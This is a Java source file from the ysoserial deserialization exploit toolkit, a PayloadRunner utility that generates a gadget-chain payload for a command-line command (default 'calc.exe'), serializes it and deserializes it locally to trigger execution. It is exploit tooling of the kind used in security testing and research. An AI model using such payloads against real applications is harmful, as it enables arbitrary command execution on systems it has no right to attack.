package ysoserial.payloads.util;

import static ysoserial.payloads.util.Serializables.deserialize;
import static ysoserial.payloads.util.Serializables.serialize;

import java.util.concurrent.Callable;

import ysoserial.ExecBlockingSecurityManager;
import ysoserial.payloads.ObjectPayload;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {
	public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {		
		// ensure payload generation doesn't throw an exception
		byte[] serialized = ExecBlockingSecurityManager.wrap(new Callable<byte[]>(){
			public byte[] call() throws Exception {
				final String command = args.length > 0 && args[0] != null ? args[0] : "calc.exe";
				
				System.out.println("generating payload object(s) for command: '" + command + "'");
				
				final Object objBefore = clazz.newInstance().getObject(command);
				
				System.out.println("serializing payload");
				
				return serialize(objBefore);
		}});			
			
		try {	
			System.out.println("deserializing payload");			
			final Object objAfter = deserialize(serialized);			
		} catch (Exception e) {
			e.printStackTrace();
		}

	}	
	
}
